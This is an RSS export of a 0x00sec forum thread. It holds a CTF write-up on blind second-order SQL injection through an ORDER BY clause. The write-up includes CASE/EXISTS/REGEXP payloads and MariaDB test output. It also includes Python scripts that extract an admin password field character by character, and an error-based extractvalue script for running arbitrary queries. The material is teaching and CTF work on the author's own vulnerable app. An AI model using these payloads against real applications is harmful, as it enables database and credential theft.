<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
    <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122</link>
    <description>Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.

__Introduction__
Let me start by saying that this article assumes that you understand the fundamentals of SQL Injection, and you are comfortable with exploiting basic SQL Vulnerabilities.

If you have ever looked into the topic in depth enough, you will have realized that depending on where the injection point is in the query, the limitations may vary, and the difficulty of exploitation may increase.

In this post I will be talking about some of the independent research I have undergone over the past week, relating to Blind Second Order SQL Injections in ORDER BY clauses.

I am going to individually explain the parts of this vulnerability, and then demonstrate how I was able to develop a solution for each individual problem that Blind Second Order SQL Injections may present.

__Blind SQL Injection__:
*Explanation*
Blind SQL Injections are any SQL Injections where direct database output is not offered, so you are essentially trying to leak data &quot;blindly&quot;. An example of this could be a logging system, where they insert the logs into a table, and you never see the logs, or the commands output. A basic solution for this would be using the sleep() function that most, if not all DBMS&#39; have.

*Explanation of solution*
The sleep function causes the DBMS to not respond for a set amount of time, meaning that you can convert your query into some sort of a boolean query so the output is true or false, and if it is true, then make the DBMS sleep, due to the DBMS sleeping, the server response time will be longer, and you will be able to tell what the boolean SQL queries output was.

*Example boolean sleep SQL Query*
`IF ([CONDITION]) THEN sleep(3); ELSE sleep(0); END IF; END;`

In the example above, it checks whether the condition is true or false, and then depending on the conditions output, it will either sleep for 3 seconds, or 0 seconds.

Although, in our situation, instead of using sleep, we will be making the post order either be alphabetically ordered title or alphabetically ordered contents, so we can create a post called &quot;A&quot; with &quot;Z&quot; as the contents, and another post called &quot;Z&quot; with &quot;A&quot; as the contents.

__Second Order SQL Injection__:
*Explanation*
For the people who may not have heard of Second Order SQL Injections, here is a perfect explanation pulled directly from https://portswigger.net/kb/issues/00100210_sql-injection-second-order
&gt; Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.

Due to second order SQL Injections not taking user input directly from the user, but instead storing it in another part of the database or backed (it could be stored in a cookie), it is generally harder to recognize and find in larger applications.

__Injection point being the ORDER BY clause__:
*Explanation*
SQL Query syntax is extremely specific, and not flexible enough for the usual SQL Injection payloads that make use of UNION to append data onto what the database already responds with.

*Explanation of solution*
After some research, I came to the conclusion* that if the injection point is directly after the ORDER BY clause (for example: `SELECT * FROM users WHERE name = &quot;test&quot; ORDER BY USER-INPUT;`) then you can make use of the CASE clause that exists in certain DBMS&#39;, for my research I used MySQL as the DBMS of choice.

The technique I have managed to come up with for this explicit situation looks something like this:
`(SELECT (CASE WHEN EXISTS(SELECT [column] FROM [table] WHERE [column] REGEXP &quot;^.*&quot; AND [FURTHER CONDITIONS]) THEN [One column name] ELSE [Another column name] END));`

Here are some examples of testing this query on MySQL directly:
```
MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP &quot;^.*&quot;) THEN post_
creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP &quot;^x.*&quot;) THEN post
_creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)
```
As demonstrated above, when the regex that the password is compared to returns true, the posts are ordered by the post title (F is before t in the alphabet, so `From: chivato` is displayed before the `test` post). The opposite can also be seen in the next query, where the regex now checks if the password field entry starts with &quot;x&quot; (this has to be false since I am using md5 to hash my passwords, and there will never be an x in an md5 hash due to the hex encoding), due to this query being false, the posts are now ordered by post contents (t is before W in the alphabet, so the posts that have content starting with `t` are displayed before the ones that have contents starting with `W`).

__Breakdown__:
Now let&#39;s break this query down, and explain each separate part of it, to facilitate the visualization of the situation / back-end processing, I have developed a vulnerable social media app (the Shitter webapp used in the CTF), where a user can create a post and then change the order of these posts (this is the injection point) in settings, where the order selected is inserted into the user&#39;s server signed cookie, the contents of the &quot;order&quot; value in the cookie are then placed directly into a SQL query (inside the ORDER BY clause), finall being executed when the posts are being taken from the database (when a profile is being loaded up).

So, the initial SELECT() inserts the internal queries output into the end of the query, inside that parentesis, we have an EXIST(SELECT...), this exist converts the query to a boolean query, since it makes it so that, if there is an output for the select query in the center of the nested query, then the exist will output 1, if not, it will return 0, 1 being true, 0 being false.

This is where the CASE part comes in, if the EXIST part of the statement responds with 1, then the case will order by the first column specified, if not, it will order by the second column specified, so you can go to the page used to trigger the second order SQLi, and depending on the output order of the posts, you will know if the EXISTS returned 0 or 1.

Finally, the inside of the EXISTS() function is a normal query, that uses a REGEXP to bruteforce one character at a time (if it is a hash, then you only need a-f and 0-9, due to hex encoding on the &#39;mainstream&#39; hashes). In our case we want to leak a flag, so I have developed the following script that bruteforces the REGEXP character by character using a set dictionary of basic alhpanumeric chars (a-zA-Z0-9).

Essentially, instead of using the sleep function (which would be much slower and would not work due to the situation of the injection point), we make use of the fact that we have control over the ORDER BY clause, and use this as our true / false identifier instead of the response time of the server.

__Shitter solution__:

Upon finding the injection point we see &quot;post_creation_time asc&quot;, which could only fit in the ORDER BY clause of a SQL Query, so we know where our injection is being inserted into, let&#39;s see if it is vulnerable.

So we send the request to update the post order and add a `&#39;` on the end:
![](upload://xO8XzaRYSW2CCY6JFxw6S899yhK.png)

Now we try and trigger the SQL Query by loading a users posts:
![](upload://bWplXF2cdFb4Jvxj0i7bplQAzql.png)

Perfect, we get a sql error due to the unterminated string (this is due to the standalone `&#39;`).

Now we can get to the actual injection, we know we control anything after the ORDER BY clause, so we control the posts order, I wonder if there is a way of using IF statements in MySQL, initially I came across this: http://www.mysqltutorial.org/mysql-if-statement/, although I was not able to get this to work, I believe this is due to the IF statement needing to either be at the start of the query, or in a set SQL procedure.

Then I remembered there being a similar &quot;CASE&quot; (https://www.w3schools.com/sql/func_mysql_case.asp) clause in MySQL that has a very similar functionality, if not identical to IF statements, which can be placed anywhere in a SQL query, so I tried it in my make-shift shitter database and boom! It works (after a while of fiddling with the statement).

```
MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=1) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| A          | Z            | 2019-12-17 13:21:20 |
| Z          | A            | 2019-12-17 13:21:25 |
+------------+--------------+---------------------+
2 rows in set (0.02 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=2) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| Z          | A            | 2019-12-17 13:21:25 |
| A          | Z            | 2019-12-17 13:21:20 |
+------------+--------------+---------------------+
2 rows in set (0.01 sec)

MariaDB [shitter]&gt;
```

So we now have a working injection, let&#39;s try it on shitter, first we make the condition true:
![](upload://zqKOBMoQBxSDZpjH0TVDAmxueZV.png)
And we trigger the SQL Injection:
![](upload://3CfsCSdmhre230NkkOa6m0lkFbR.png)
Cool, so the posts were ordered by the post_title, and not the contents.

Now let&#39;s demonstrate the other way around:
![](upload://gFY8Dg4sgaYBxAovTfpk5WyFCPL.png)
![](upload://7RbVNbzdWX7LWqUNlcPb2qxkjBQ.png)

We have confirmed that depending on whether the output of the statement is 0 or 1, the post will either be ordered by title, or contents. We can combine this idea with EXISTS() (https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html) and REGEXP (https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php) to slowly leak the contents of the admin password field.

I developed a short script to automate this:

```python
import requests, time

s = requests.Session()
dictionary = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;0&#39;,&#39;_&#39;,&#39;{&#39;,&#39;}&#39;]
URL = &quot;http://gusralph.info:5000&quot;
username = &quot;demo&quot;
password = &quot;demo&quot;
data = {&#39;name&#39; : username, &#39;password&#39; : password}
r = s.post(url = URL + &quot;/login&quot;, data = data)
final = &quot;&quot;

while True:
        data = {&#39;order&#39; : &#39;post_creation_time ASC&#39;}
        r = s.post(url = URL + &quot;/settings&quot;, data = data)
        for x in dictionary:
                data = {&#39;order&#39; : &#39;(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP &quot;^&#39; + str(final) + x + &#39;.*&quot; AND name = &quot;admin&quot;) THEN post_content ELSE post_creation_time END)); -- -&#39;}
                r = s.post(url = URL + &quot;/settings&quot;, data = data)
                out = s.get(url = URL + &quot;/profile/2&quot;)
                if out.text.find(&#39;aaaaaaasdsd&#39;) &lt; out.text.find(&#39;ZZZZ&#39;):
                        final += x
                        print &quot;Leaking contents of admin hash: &quot; + final
                        break
                else:
                        pass
```
This script manages to leak the contents of the admin password field:
```
chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: t
Leaking contents of admin hash: tm
Leaking contents of admin hash: tmh
Leaking contents of admin hash: tmhc
Leaking contents of admin hash: tmhc{
Leaking contents of admin hash: tmhc{b
Leaking contents of admin hash: tmhc{bl
Leaking contents of admin hash: tmhc{bl1
[...]
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinje
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjec
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinject
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n}
```
Although, the MySQL REGEXP function is not case sensitive (https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php), so I added the `BINARY` function after the REGEXP to create the final script:

```python
import requests, time

s = requests.Session()
dictionary = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;0&#39;,&#39;_&#39;,&#39;{&#39;,&#39;}&#39;]
URL = &quot;http://gusralph.info:5000&quot;
username = &quot;demo&quot;
password = &quot;demo&quot;
data = {&#39;name&#39; : username, &#39;password&#39; : password}
r = s.post(url = URL + &quot;/login&quot;, data = data)
final = &quot;&quot;

while True:
        data = {&#39;order&#39; : &#39;post_creation_time ASC&#39;}
        r = s.post(url = URL + &quot;/settings&quot;, data = data)
        for x in dictionary:
                data = {&#39;order&#39; : &#39;(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP BINARY &quot;^&#39; + str(final) + x + &#39;.*&quot; AND name = &quot;admin&quot;) THEN post_content ELSE post_creation_time END)); -- -&#39;}
                r = s.post(url = URL + &quot;/settings&quot;, data = data)
                out = s.get(url = URL + &quot;/profile/2&quot;)
                if out.text.find(&#39;aaaaaaasdsd&#39;) &lt; out.text.find(&#39;ZZZZ&#39;):
                        final += x
                        print &quot;Leaking contents of admin hash: &quot; + final
                        break
                else:
                        pass
```

With the final result being:
```
chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: T
Leaking contents of admin hash: TM
Leaking contents of admin hash: TMH
Leaking contents of admin hash: TMHC
Leaking contents of admin hash: TMHC{
Leaking contents of admin hash: TMHC{B
[..]
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJect
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n}
```
__Unintended methods of solving Shitter__:
*Alternative (kudos to Morph3 (https://twitter.com/melihkaanyldz))*:
In the CTF I forgot to add a try: except: into the script to handle the python errors, which can sometimes be overly verbose. If I had added the try and except it would have just redirected to a /error page. Due to the overly verbose error messages, and the flask debug being set to True in my script, there was a certain payload that could be used, that caused the flask error message to actually display the queries output.

An example of what the output would look like is:
```
  File &quot;/home/chivato/.local/lib/python2.7/site-packages/pymysql/protocol.py&quot;, line 220, in check_error
    err.raise_mysql_exception(self._data)
  File &quot;/home/chivato/.local/lib/python2.7/site-packages/pymysql/err.py&quot;, line 109, in raise_mysql_exception
    raise errorclass(errno, errval)
InternalError: (1105, u&quot;XPATH syntax error: &#39;\nTMHC{Bl1nDSQlS3c0ndorderINJecti&#39;&quot;)

--&gt;
```

The query that breaks the challenge being:
`1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#`

Here is a script he developed to automate the process:
```python
import requests

s = requests.Session()

url = &quot;URL:PORT/&quot;
data = {
    &quot;name&quot;:&quot;USERNAME&quot;,
    &quot;password&quot;:&quot;PASSWORD&quot;
}

r = s.post(url+&quot;login&quot;,data=data)

q = &quot;select database()&quot;

while q != &quot;q&quot;:
    data = {
         &quot;order&quot; : &quot;1,extractvalue(0x0a,concat(0x0a,({})))#&quot;.format(q)
    }
    r = s.post(url+&quot;settings&quot;,data=data)
    r = s.get(url+&quot;profile/1&quot;)
    print r.text
    q = raw_input(&quot;~#:&quot;)
```

If you enjoyed the post, learnt something new, or have any feedback / improvements, make sure to follow me on Twitter (https://twitter.com/SecGus).

*If anyone has been able to successfully exfiltrate data via the ORDER BY clause in MySQL when the column name is hard-coded (like this `SELECT * FROM users WHERE name = &quot;example&quot; ORDER BY name USER-INPUT;`), I would love to know how, my DMs on here are always open, or you can reach me on twitter (see above), or via email at rat@outlook.at.</description>
    
    <lastBuildDate>Wed, 15 Apr 2020 15:01:33 +0000</lastBuildDate>
    <category>Web Hacking</category>
    <atom:link href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/4</link>
        <pubDate>Fri, 17 Apr 2020 05:57:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18122-4</guid>
        <source url="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
      </item>
      <item>
        <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
        <dc:creator><![CDATA[chivato]]></dc:creator>
        <description><![CDATA[
            <p>Hahahaha, need to get more content pumped out on here. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/3</link>
        <pubDate>Wed, 15 Apr 2020 15:01:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18122-3</guid>
        <source url="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
      </item>
      <item>
        <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Sorry another bump…</p>
          <p><a href="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122/2</link>
        <pubDate>Wed, 15 Apr 2020 14:58:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18122-2</guid>
        <source url="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
      </item>
      <item>
        <title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</title>
        <dc:creator><![CDATA[chivato]]></dc:creator>
        <description><![CDATA[
            <p>Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.</p>
<p><strong>Introduction</strong><br>
Let me start by saying that this article assumes that you understand the fundamentals of SQL Injection, and you are comfortable with exploiting basic SQL Vulnerabilities.</p>
<p>If you have ever looked into the topic in depth enough, you will have realized that depending on where the injection point is in the query, the limitations may vary, and the difficulty of exploitation may increase.</p>
<p>In this post I will be talking about some of the independent research I have undergone over the past week, relating to Blind Second Order SQL Injections in ORDER BY clauses.</p>
<p>I am going to individually explain the parts of this vulnerability, and then demonstrate how I was able to develop a solution for each individual problem that Blind Second Order SQL Injections may present.</p>
<p><strong>Blind SQL Injection</strong>:<br>
<em>Explanation</em><br>
Blind SQL Injections are any SQL Injections where direct database output is not offered, so you are essentially trying to leak data “blindly”. An example of this could be a logging system, where they insert the logs into a table, and you never see the logs, or the commands output. A basic solution for this would be using the sleep() function that most, if not all DBMS’ have.</p>
<p><em>Explanation of solution</em><br>
The sleep function causes the DBMS to not respond for a set amount of time, meaning that you can convert your query into some sort of a boolean query so the output is true or false, and if it is true, then make the DBMS sleep, due to the DBMS sleeping, the server response time will be longer, and you will be able to tell what the boolean SQL queries output was.</p>
<p><em>Example boolean sleep SQL Query</em><br>
<code>IF ([CONDITION]) THEN sleep(3); ELSE sleep(0); END IF; END;</code></p>
<p>In the example above, it checks whether the condition is true or false, and then depending on the conditions output, it will either sleep for 3 seconds, or 0 seconds.</p>
<p>Although, in our situation, instead of using sleep, we will be making the post order either be alphabetically ordered title or alphabetically ordered contents, so we can create a post called “A” with “Z” as the contents, and another post called “Z” with “A” as the contents.</p>
<p><strong>Second Order SQL Injection</strong>:<br>
<em>Explanation</em><br>
For the people who may not have heard of Second Order SQL Injections, here is a perfect explanation pulled directly from <a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" rel="noopener nofollow ugc">https://portswigger.net/kb/issues/00100210_sql-injection-second-order</a></p>
<blockquote>
<p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</p>
</blockquote>
<p>Due to second order SQL Injections not taking user input directly from the user, but instead storing it in another part of the database or backed (it could be stored in a cookie), it is generally harder to recognize and find in larger applications.</p>
<p><strong>Injection point being the ORDER BY clause</strong>:<br>
<em>Explanation</em><br>
SQL Query syntax is extremely specific, and not flexible enough for the usual SQL Injection payloads that make use of UNION to append data onto what the database already responds with.</p>
<p><em>Explanation of solution</em><br>
After some research, I came to the conclusion* that if the injection point is directly after the ORDER BY clause (for example: <code>SELECT * FROM users WHERE name = "test" ORDER BY USER-INPUT;</code>) then you can make use of the CASE clause that exists in certain DBMS’, for my research I used MySQL as the DBMS of choice.</p>
<p>The technique I have managed to come up with for this explicit situation looks something like this:<br>
<code>(SELECT (CASE WHEN EXISTS(SELECT [column] FROM [table] WHERE [column] REGEXP "^.*" AND [FURTHER CONDITIONS]) THEN [One column name] ELSE [Another column name] END));</code></p>
<p>Here are some examples of testing this query on MySQL directly:</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^.*") THEN post_
creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^x.*") THEN post
_creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)
</code></pre>
<p>As demonstrated above, when the regex that the password is compared to returns true, the posts are ordered by the post title (F is before t in the alphabet, so <code>From: chivato</code> is displayed before the <code>test</code> post). The opposite can also be seen in the next query, where the regex now checks if the password field entry starts with “x” (this has to be false since I am using md5 to hash my passwords, and there will never be an x in an md5 hash due to the hex encoding), due to this query being false, the posts are now ordered by post contents (t is before W in the alphabet, so the posts that have content starting with <code>t</code> are displayed before the ones that have contents starting with <code>W</code>).</p>
<p><strong>Breakdown</strong>:<br>
Now let’s break this query down, and explain each separate part of it, to facilitate the visualization of the situation / back-end processing, I have developed a vulnerable social media app (the Shitter webapp used in the CTF), where a user can create a post and then change the order of these posts (this is the injection point) in settings, where the order selected is inserted into the user’s server signed cookie, the contents of the “order” value in the cookie are then placed directly into a SQL query (inside the ORDER BY clause), finall being executed when the posts are being taken from the database (when a profile is being loaded up).</p>
<p>So, the initial SELECT() inserts the internal queries output into the end of the query, inside that parentesis, we have an EXIST(SELECT…), this exist converts the query to a boolean query, since it makes it so that, if there is an output for the select query in the center of the nested query, then the exist will output 1, if not, it will return 0, 1 being true, 0 being false.</p>
<p>This is where the CASE part comes in, if the EXIST part of the statement responds with 1, then the case will order by the first column specified, if not, it will order by the second column specified, so you can go to the page used to trigger the second order SQLi, and depending on the output order of the posts, you will know if the EXISTS returned 0 or 1.</p>
<p>Finally, the inside of the EXISTS() function is a normal query, that uses a REGEXP to bruteforce one character at a time (if it is a hash, then you only need a-f and 0-9, due to hex encoding on the ‘mainstream’ hashes). In our case we want to leak a flag, so I have developed the following script that bruteforces the REGEXP character by character using a set dictionary of basic alhpanumeric chars (a-zA-Z0-9).</p>
<p>Essentially, instead of using the sleep function (which would be much slower and would not work due to the situation of the injection point), we make use of the fact that we have control over the ORDER BY clause, and use this as our true / false identifier instead of the response time of the server.</p>
<p><strong>Shitter solution</strong>:</p>
<p>Upon finding the injection point we see “post_creation_time asc”, which could only fit in the ORDER BY clause of a SQL Query, so we know where our injection is being inserted into, let’s see if it is vulnerable.</p>
<p>So we send the request to update the post order and add a <code>'</code> on the end:<br>
<img src="/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" alt="" data-base62-sha1="xO8XzaRYSW2CCY6JFxw6S899yhK" width="690" height="315"></p>
<p>Now we try and trigger the SQL Query by loading a users posts:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d.png" data-download-href="/uploads/short-url/bWplXF2cdFb4Jvxj0i7bplQAzql.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png" alt="" data-base62-sha1="bWplXF2cdFb4Jvxj0i7bplQAzql" width="690" height="353" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1035x529.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1380x706.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_10x10.png"></a></div><p></p>
<p>Perfect, we get a sql error due to the unterminated string (this is due to the standalone <code>'</code>).</p>
<p>Now we can get to the actual injection, we know we control anything after the ORDER BY clause, so we control the posts order, I wonder if there is a way of using IF statements in MySQL, initially I came across this: <a href="http://www.mysqltutorial.org/mysql-if-statement/" rel="noopener nofollow ugc">http://www.mysqltutorial.org/mysql-if-statement/</a>, although I was not able to get this to work, I believe this is due to the IF statement needing to either be at the start of the query, or in a set SQL procedure.</p>
<p>Then I remembered there being a similar “CASE” (<a href="https://www.w3schools.com/sql/func_mysql_case.asp" rel="noopener nofollow ugc">https://www.w3schools.com/sql/func_mysql_case.asp</a>) clause in MySQL that has a very similar functionality, if not identical to IF statements, which can be placed anywhere in a SQL query, so I tried it in my make-shift shitter database and boom! It works (after a while of fiddling with the statement).</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=1) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| A          | Z            | 2019-12-17 13:21:20 |
| Z          | A            | 2019-12-17 13:21:25 |
+------------+--------------+---------------------+
2 rows in set (0.02 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=2) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| Z          | A            | 2019-12-17 13:21:25 |
